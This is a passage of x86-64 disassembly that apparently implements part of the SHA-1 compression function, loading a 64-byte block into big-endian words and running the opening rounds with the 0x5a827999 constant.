  4032f0:	0f b6 c0             	movzbl %al,%eax
  4032f3:	48 c1 e0 10          	shl    $0x10,%rax
  4032f7:	48 09 c2             	or     %rax,%rdx
  4032fa:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403301:	48 83 c0 1a          	add    $0x1a,%rax
  403305:	0f b6 00             	movzbl (%rax),%eax
  403308:	0f b6 c0             	movzbl %al,%eax
  40330b:	48 c1 e0 08          	shl    $0x8,%rax
  40330f:	48 09 c2             	or     %rax,%rdx
  403312:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403319:	48 83 c0 1b          	add    $0x1b,%rax
  40331d:	0f b6 00             	movzbl (%rax),%eax
  403320:	0f b6 c0             	movzbl %al,%eax
  403323:	48 09 d0             	or     %rdx,%rax
  403326:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
  40332a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403331:	48 83 c0 1c          	add    $0x1c,%rax
  403335:	0f b6 00             	movzbl (%rax),%eax
  403338:	0f b6 c0             	movzbl %al,%eax
  40333b:	48 c1 e0 18          	shl    $0x18,%rax
  40333f:	48 89 c2             	mov    %rax,%rdx
  403342:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403349:	48 83 c0 1d          	add    $0x1d,%rax
  40334d:	0f b6 00             	movzbl (%rax),%eax
  403350:	0f b6 c0             	movzbl %al,%eax
  403353:	48 c1 e0 10          	shl    $0x10,%rax
  403357:	48 09 c2             	or     %rax,%rdx
  40335a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403361:	48 83 c0 1e          	add    $0x1e,%rax
  403365:	0f b6 00             	movzbl (%rax),%eax
  403368:	0f b6 c0             	movzbl %al,%eax
  40336b:	48 c1 e0 08          	shl    $0x8,%rax
  40336f:	48 09 c2             	or     %rax,%rdx
  403372:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403379:	48 83 c0 1f          	add    $0x1f,%rax
  40337d:	0f b6 00             	movzbl (%rax),%eax
  403380:	0f b6 c0             	movzbl %al,%eax
  403383:	48 09 d0             	or     %rdx,%rax
  403386:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
  40338a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403391:	48 83 c0 20          	add    $0x20,%rax
  403395:	0f b6 00             	movzbl (%rax),%eax
  403398:	0f b6 c0             	movzbl %al,%eax
  40339b:	48 c1 e0 18          	shl    $0x18,%rax
  40339f:	48 89 c2             	mov    %rax,%rdx
  4033a2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4033a9:	48 83 c0 21          	add    $0x21,%rax
  4033ad:	0f b6 00             	movzbl (%rax),%eax
  4033b0:	0f b6 c0             	movzbl %al,%eax
  4033b3:	48 c1 e0 10          	shl    $0x10,%rax
  4033b7:	48 09 c2             	or     %rax,%rdx
  4033ba:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4033c1:	48 83 c0 22          	add    $0x22,%rax
  4033c5:	0f b6 00             	movzbl (%rax),%eax
  4033c8:	0f b6 c0             	movzbl %al,%eax
  4033cb:	48 c1 e0 08          	shl    $0x8,%rax
  4033cf:	48 09 c2             	or     %rax,%rdx
  4033d2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4033d9:	48 83 c0 23          	add    $0x23,%rax
  4033dd:	0f b6 00             	movzbl (%rax),%eax
  4033e0:	0f b6 c0             	movzbl %al,%eax
  4033e3:	48 09 d0             	or     %rdx,%rax
  4033e6:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  4033ea:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4033f1:	48 83 c0 24          	add    $0x24,%rax
  4033f5:	0f b6 00             	movzbl (%rax),%eax
  4033f8:	0f b6 c0             	movzbl %al,%eax
  4033fb:	48 c1 e0 18          	shl    $0x18,%rax
  4033ff:	48 89 c2             	mov    %rax,%rdx
  403402:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403409:	48 83 c0 25          	add    $0x25,%rax
  40340d:	0f b6 00             	movzbl (%rax),%eax
  403410:	0f b6 c0             	movzbl %al,%eax
  403413:	48 c1 e0 10          	shl    $0x10,%rax
  403417:	48 09 c2             	or     %rax,%rdx
  40341a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403421:	48 83 c0 26          	add    $0x26,%rax
  403425:	0f b6 00             	movzbl (%rax),%eax
  403428:	0f b6 c0             	movzbl %al,%eax
  40342b:	48 c1 e0 08          	shl    $0x8,%rax
  40342f:	48 09 c2             	or     %rax,%rdx
  403432:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403439:	48 83 c0 27          	add    $0x27,%rax
  40343d:	0f b6 00             	movzbl (%rax),%eax
  403440:	0f b6 c0             	movzbl %al,%eax
  403443:	48 09 d0             	or     %rdx,%rax
  403446:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  40344a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403451:	48 83 c0 28          	add    $0x28,%rax
  403455:	0f b6 00             	movzbl (%rax),%eax
  403458:	0f b6 c0             	movzbl %al,%eax
  40345b:	48 c1 e0 18          	shl    $0x18,%rax
  40345f:	48 89 c2             	mov    %rax,%rdx
  403462:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403469:	48 83 c0 29          	add    $0x29,%rax
  40346d:	0f b6 00             	movzbl (%rax),%eax
  403470:	0f b6 c0             	movzbl %al,%eax
  403473:	48 c1 e0 10          	shl    $0x10,%rax
  403477:	48 09 c2             	or     %rax,%rdx
  40347a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403481:	48 83 c0 2a          	add    $0x2a,%rax
  403485:	0f b6 00             	movzbl (%rax),%eax
  403488:	0f b6 c0             	movzbl %al,%eax
  40348b:	48 c1 e0 08          	shl    $0x8,%rax
  40348f:	48 09 c2             	or     %rax,%rdx
  403492:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403499:	48 83 c0 2b          	add    $0x2b,%rax
  40349d:	0f b6 00             	movzbl (%rax),%eax
  4034a0:	0f b6 c0             	movzbl %al,%eax
  4034a3:	48 09 d0             	or     %rdx,%rax
  4034a6:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  4034aa:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4034b1:	48 83 c0 2c          	add    $0x2c,%rax
  4034b5:	0f b6 00             	movzbl (%rax),%eax
  4034b8:	0f b6 c0             	movzbl %al,%eax
  4034bb:	48 c1 e0 18          	shl    $0x18,%rax
  4034bf:	48 89 c2             	mov    %rax,%rdx
  4034c2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4034c9:	48 83 c0 2d          	add    $0x2d,%rax
  4034cd:	0f b6 00             	movzbl (%rax),%eax
  4034d0:	0f b6 c0             	movzbl %al,%eax
  4034d3:	48 c1 e0 10          	shl    $0x10,%rax
  4034d7:	48 09 c2             	or     %rax,%rdx
  4034da:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4034e1:	48 83 c0 2e          	add    $0x2e,%rax
  4034e5:	0f b6 00             	movzbl (%rax),%eax
  4034e8:	0f b6 c0             	movzbl %al,%eax
  4034eb:	48 c1 e0 08          	shl    $0x8,%rax
  4034ef:	48 09 c2             	or     %rax,%rdx
  4034f2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4034f9:	48 83 c0 2f          	add    $0x2f,%rax
  4034fd:	0f b6 00             	movzbl (%rax),%eax
  403500:	0f b6 c0             	movzbl %al,%eax
  403503:	48 09 d0             	or     %rdx,%rax
  403506:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
  40350a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403511:	48 83 c0 30          	add    $0x30,%rax
  403515:	0f b6 00             	movzbl (%rax),%eax
  403518:	0f b6 c0             	movzbl %al,%eax
  40351b:	48 c1 e0 18          	shl    $0x18,%rax
  40351f:	48 89 c2             	mov    %rax,%rdx
  403522:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403529:	48 83 c0 31          	add    $0x31,%rax
  40352d:	0f b6 00             	movzbl (%rax),%eax
  403530:	0f b6 c0             	movzbl %al,%eax
  403533:	48 c1 e0 10          	shl    $0x10,%rax
  403537:	48 09 c2             	or     %rax,%rdx
  40353a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403541:	48 83 c0 32          	add    $0x32,%rax
  403545:	0f b6 00             	movzbl (%rax),%eax
  403548:	0f b6 c0             	movzbl %al,%eax
  40354b:	48 c1 e0 08          	shl    $0x8,%rax
  40354f:	48 09 c2             	or     %rax,%rdx
  403552:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403559:	48 83 c0 33          	add    $0x33,%rax
  40355d:	0f b6 00             	movzbl (%rax),%eax
  403560:	0f b6 c0             	movzbl %al,%eax
  403563:	48 09 d0             	or     %rdx,%rax
  403566:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  40356a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403571:	48 83 c0 34          	add    $0x34,%rax
  403575:	0f b6 00             	movzbl (%rax),%eax
  403578:	0f b6 c0             	movzbl %al,%eax
  40357b:	48 c1 e0 18          	shl    $0x18,%rax
  40357f:	48 89 c2             	mov    %rax,%rdx
  403582:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403589:	48 83 c0 35          	add    $0x35,%rax
  40358d:	0f b6 00             	movzbl (%rax),%eax
  403590:	0f b6 c0             	movzbl %al,%eax
  403593:	48 c1 e0 10          	shl    $0x10,%rax
  403597:	48 09 c2             	or     %rax,%rdx
  40359a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4035a1:	48 83 c0 36          	add    $0x36,%rax
  4035a5:	0f b6 00             	movzbl (%rax),%eax
  4035a8:	0f b6 c0             	movzbl %al,%eax
  4035ab:	48 c1 e0 08          	shl    $0x8,%rax
  4035af:	48 09 c2             	or     %rax,%rdx
  4035b2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4035b9:	48 83 c0 37          	add    $0x37,%rax
  4035bd:	0f b6 00             	movzbl (%rax),%eax
  4035c0:	0f b6 c0             	movzbl %al,%eax
  4035c3:	48 09 d0             	or     %rdx,%rax
  4035c6:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  4035ca:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4035d1:	48 83 c0 38          	add    $0x38,%rax
  4035d5:	0f b6 00             	movzbl (%rax),%eax
  4035d8:	0f b6 c0             	movzbl %al,%eax
  4035db:	48 c1 e0 18          	shl    $0x18,%rax
  4035df:	48 89 c2             	mov    %rax,%rdx
  4035e2:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  4035e9:	48 83 c0 39          	add    $0x39,%rax
  4035ed:	0f b6 00             	movzbl (%rax),%eax
  4035f0:	0f b6 c0             	movzbl %al,%eax
  4035f3:	48 c1 e0 10          	shl    $0x10,%rax
  4035f7:	48 09 c2             	or     %rax,%rdx
  4035fa:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403601:	48 83 c0 3a          	add    $0x3a,%rax
  403605:	0f b6 00             	movzbl (%rax),%eax
  403608:	0f b6 c0             	movzbl %al,%eax
  40360b:	48 c1 e0 08          	shl    $0x8,%rax
  40360f:	48 09 c2             	or     %rax,%rdx
  403612:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403619:	48 83 c0 3b          	add    $0x3b,%rax
  40361d:	0f b6 00             	movzbl (%rax),%eax
  403620:	0f b6 c0             	movzbl %al,%eax
  403623:	48 09 d0             	or     %rdx,%rax
  403626:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  40362a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403631:	48 83 c0 3c          	add    $0x3c,%rax
  403635:	0f b6 00             	movzbl (%rax),%eax
  403638:	0f b6 c0             	movzbl %al,%eax
  40363b:	48 c1 e0 18          	shl    $0x18,%rax
  40363f:	48 89 c2             	mov    %rax,%rdx
  403642:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403649:	48 83 c0 3d          	add    $0x3d,%rax
  40364d:	0f b6 00             	movzbl (%rax),%eax
  403650:	0f b6 c0             	movzbl %al,%eax
  403653:	48 c1 e0 10          	shl    $0x10,%rax
  403657:	48 09 c2             	or     %rax,%rdx
  40365a:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403661:	48 83 c0 3e          	add    $0x3e,%rax
  403665:	0f b6 00             	movzbl (%rax),%eax
  403668:	0f b6 c0             	movzbl %al,%eax
  40366b:	48 c1 e0 08          	shl    $0x8,%rax
  40366f:	48 09 c2             	or     %rax,%rdx
  403672:	48 8b 85 40 ff ff ff 	mov    -0xc0(%rbp),%rax
  403679:	48 83 c0 3f          	add    $0x3f,%rax
  40367d:	0f b6 00             	movzbl (%rax),%eax
  403680:	0f b6 c0             	movzbl %al,%eax
  403683:	48 09 d0             	or     %rdx,%rax
  403686:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  40368a:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
  403691:	48 8b 40 10          	mov    0x10(%rax),%rax
  403695:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  40369c:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
  4036a3:	48 8b 40 18          	mov    0x18(%rax),%rax
  4036a7:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  4036ae:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
  4036b5:	48 8b 40 20          	mov    0x20(%rax),%rax
  4036b9:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  4036c0:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
  4036c7:	48 8b 40 28          	mov    0x28(%rax),%rax
  4036cb:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  4036d2:	48 8b 85 48 ff ff ff 	mov    -0xb8(%rbp),%rax
  4036d9:	48 8b 40 30          	mov    0x30(%rax),%rax
  4036dd:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  4036e4:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4036eb:	48 c1 e0 05          	shl    $0x5,%rax
  4036ef:	48 89 c2             	mov    %rax,%rdx
  4036f2:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4036f9:	89 c0                	mov    %eax,%eax
  4036fb:	48 c1 e8 1b          	shr    $0x1b,%rax
  4036ff:	48 89 d1             	mov    %rdx,%rcx
  403702:	48 09 c1             	or     %rax,%rcx
  403705:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40370c:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  403713:	48 31 d0             	xor    %rdx,%rax
  403716:	48 23 85 58 ff ff ff 	and    -0xa8(%rbp),%rax
  40371d:	48 33 85 68 ff ff ff 	xor    -0x98(%rbp),%rax
  403724:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403728:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  40372c:	48 01 c2             	add    %rax,%rdx
  40372f:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403736:	48 01 d0             	add    %rdx,%rax
  403739:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  40373f:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  403746:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40374d:	48 c1 e0 1e          	shl    $0x1e,%rax
  403751:	48 89 c2             	mov    %rax,%rdx
  403754:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40375b:	89 c0                	mov    %eax,%eax
  40375d:	48 c1 e8 02          	shr    $0x2,%rax
  403761:	48 09 d0             	or     %rdx,%rax
  403764:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  40376b:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403772:	48 c1 e0 05          	shl    $0x5,%rax
  403776:	48 89 c2             	mov    %rax,%rdx
  403779:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403780:	89 c0                	mov    %eax,%eax
  403782:	48 c1 e8 1b          	shr    $0x1b,%rax
  403786:	48 89 d1             	mov    %rdx,%rcx
  403789:	48 09 c1             	or     %rax,%rcx
  40378c:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403793:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  40379a:	48 31 d0             	xor    %rdx,%rax
  40379d:	48 23 85 50 ff ff ff 	and    -0xb0(%rbp),%rax
  4037a4:	48 33 85 60 ff ff ff 	xor    -0xa0(%rbp),%rax
  4037ab:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4037af:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  4037b3:	48 01 c2             	add    %rax,%rdx
  4037b6:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4037bd:	48 01 d0             	add    %rdx,%rax
  4037c0:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  4037c6:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  4037cd:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4037d4:	48 c1 e0 1e          	shl    $0x1e,%rax
  4037d8:	48 89 c2             	mov    %rax,%rdx
  4037db:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4037e2:	89 c0                	mov    %eax,%eax
  4037e4:	48 c1 e8 02          	shr    $0x2,%rax
  4037e8:	48 09 d0             	or     %rdx,%rax
  4037eb:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  4037f2:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4037f9:	48 c1 e0 05          	shl    $0x5,%rax
  4037fd:	48 89 c2             	mov    %rax,%rdx
  403800:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403807:	89 c0                	mov    %eax,%eax
  403809:	48 c1 e8 1b          	shr    $0x1b,%rax
  40380d:	48 89 d1             	mov    %rdx,%rcx
  403810:	48 09 c1             	or     %rax,%rcx
  403813:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40381a:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  403821:	48 31 d0             	xor    %rdx,%rax
  403824:	48 23 85 70 ff ff ff 	and    -0x90(%rbp),%rax
  40382b:	48 33 85 58 ff ff ff 	xor    -0xa8(%rbp),%rax
  403832:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403836:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  40383a:	48 01 c2             	add    %rax,%rdx
  40383d:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403844:	48 01 d0             	add    %rdx,%rax
  403847:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  40384d:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  403854:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  40385b:	48 c1 e0 1e          	shl    $0x1e,%rax
  40385f:	48 89 c2             	mov    %rax,%rdx
  403862:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403869:	89 c0                	mov    %eax,%eax
  40386b:	48 c1 e8 02          	shr    $0x2,%rax
  40386f:	48 09 d0             	or     %rdx,%rax
  403872:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  403879:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403880:	48 c1 e0 05          	shl    $0x5,%rax
  403884:	48 89 c2             	mov    %rax,%rdx
  403887:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40388e:	89 c0                	mov    %eax,%eax
  403890:	48 c1 e8 1b          	shr    $0x1b,%rax
  403894:	48 89 d1             	mov    %rdx,%rcx
  403897:	48 09 c1             	or     %rax,%rcx
  40389a:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4038a1:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  4038a8:	48 31 d0             	xor    %rdx,%rax
  4038ab:	48 23 85 68 ff ff ff 	and    -0x98(%rbp),%rax
  4038b2:	48 33 85 50 ff ff ff 	xor    -0xb0(%rbp),%rax
  4038b9:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4038bd:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  4038c1:	48 01 c2             	add    %rax,%rdx
  4038c4:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4038cb:	48 01 d0             	add    %rdx,%rax
  4038ce:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  4038d4:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  4038db:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4038e2:	48 c1 e0 1e          	shl    $0x1e,%rax
  4038e6:	48 89 c2             	mov    %rax,%rdx
  4038e9:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4038f0:	89 c0                	mov    %eax,%eax
  4038f2:	48 c1 e8 02          	shr    $0x2,%rax
  4038f6:	48 09 d0             	or     %rdx,%rax
  4038f9:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  403900:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403907:	48 c1 e0 05          	shl    $0x5,%rax
  40390b:	48 89 c2             	mov    %rax,%rdx
  40390e:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403915:	89 c0                	mov    %eax,%eax
  403917:	48 c1 e8 1b          	shr    $0x1b,%rax
  40391b:	48 89 d1             	mov    %rdx,%rcx
  40391e:	48 09 c1             	or     %rax,%rcx
  403921:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403928:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  40392f:	48 31 d0             	xor    %rdx,%rax
  403932:	48 23 85 60 ff ff ff 	and    -0xa0(%rbp),%rax
  403939:	48 33 85 70 ff ff ff 	xor    -0x90(%rbp),%rax
  403940:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403944:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  403948:	48 01 c2             	add    %rax,%rdx
  40394b:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403952:	48 01 d0             	add    %rdx,%rax
  403955:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  40395b:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  403962:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403969:	48 c1 e0 1e          	shl    $0x1e,%rax
  40396d:	48 89 c2             	mov    %rax,%rdx
  403970:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403977:	89 c0                	mov    %eax,%eax
  403979:	48 c1 e8 02          	shr    $0x2,%rax
  40397d:	48 09 d0             	or     %rdx,%rax
  403980:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  403987:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40398e:	48 c1 e0 05          	shl    $0x5,%rax
  403992:	48 89 c2             	mov    %rax,%rdx
  403995:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40399c:	89 c0                	mov    %eax,%eax
  40399e:	48 c1 e8 1b          	shr    $0x1b,%rax
  4039a2:	48 89 d1             	mov    %rdx,%rcx
  4039a5:	48 09 c1             	or     %rax,%rcx
  4039a8:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4039af:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  4039b6:	48 31 d0             	xor    %rdx,%rax
  4039b9:	48 23 85 58 ff ff ff 	and    -0xa8(%rbp),%rax
  4039c0:	48 33 85 68 ff ff ff 	xor    -0x98(%rbp),%rax
  4039c7:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4039cb:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  4039cf:	48 01 c2             	add    %rax,%rdx
  4039d2:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4039d9:	48 01 d0             	add    %rdx,%rax
  4039dc:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  4039e2:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  4039e9:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4039f0:	48 c1 e0 1e          	shl    $0x1e,%rax
  4039f4:	48 89 c2             	mov    %rax,%rdx
  4039f7:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4039fe:	89 c0                	mov    %eax,%eax
  403a00:	48 c1 e8 02          	shr    $0x2,%rax
  403a04:	48 09 d0             	or     %rdx,%rax
  403a07:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  403a0e:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403a15:	48 c1 e0 05          	shl    $0x5,%rax
  403a19:	48 89 c2             	mov    %rax,%rdx
  403a1c:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403a23:	89 c0                	mov    %eax,%eax
  403a25:	48 c1 e8 1b          	shr    $0x1b,%rax
  403a29:	48 89 d1             	mov    %rdx,%rcx
  403a2c:	48 09 c1             	or     %rax,%rcx
  403a2f:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403a36:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  403a3d:	48 31 d0             	xor    %rdx,%rax
  403a40:	48 23 85 50 ff ff ff 	and    -0xb0(%rbp),%rax
  403a47:	48 33 85 60 ff ff ff 	xor    -0xa0(%rbp),%rax
  403a4e:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403a52:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  403a56:	48 01 c2             	add    %rax,%rdx
  403a59:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403a60:	48 01 d0             	add    %rdx,%rax
  403a63:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403a69:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  403a70:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403a77:	48 c1 e0 1e          	shl    $0x1e,%rax
  403a7b:	48 89 c2             	mov    %rax,%rdx
  403a7e:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403a85:	89 c0                	mov    %eax,%eax
  403a87:	48 c1 e8 02          	shr    $0x2,%rax
  403a8b:	48 09 d0             	or     %rdx,%rax
  403a8e:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  403a95:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403a9c:	48 c1 e0 05          	shl    $0x5,%rax
  403aa0:	48 89 c2             	mov    %rax,%rdx
  403aa3:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403aaa:	89 c0                	mov    %eax,%eax
  403aac:	48 c1 e8 1b          	shr    $0x1b,%rax
  403ab0:	48 89 d1             	mov    %rdx,%rcx
  403ab3:	48 09 c1             	or     %rax,%rcx
  403ab6:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403abd:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  403ac4:	48 31 d0             	xor    %rdx,%rax
  403ac7:	48 23 85 70 ff ff ff 	and    -0x90(%rbp),%rax
  403ace:	48 33 85 58 ff ff ff 	xor    -0xa8(%rbp),%rax
  403ad5:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403ad9:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  403add:	48 01 c2             	add    %rax,%rdx
  403ae0:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403ae7:	48 01 d0             	add    %rdx,%rax
  403aea:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403af0:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  403af7:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403afe:	48 c1 e0 1e          	shl    $0x1e,%rax
  403b02:	48 89 c2             	mov    %rax,%rdx
  403b05:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403b0c:	89 c0                	mov    %eax,%eax
  403b0e:	48 c1 e8 02          	shr    $0x2,%rax
  403b12:	48 09 d0             	or     %rdx,%rax
  403b15:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  403b1c:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403b23:	48 c1 e0 05          	shl    $0x5,%rax
  403b27:	48 89 c2             	mov    %rax,%rdx
  403b2a:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403b31:	89 c0                	mov    %eax,%eax
  403b33:	48 c1 e8 1b          	shr    $0x1b,%rax
  403b37:	48 89 d1             	mov    %rdx,%rcx
  403b3a:	48 09 c1             	or     %rax,%rcx
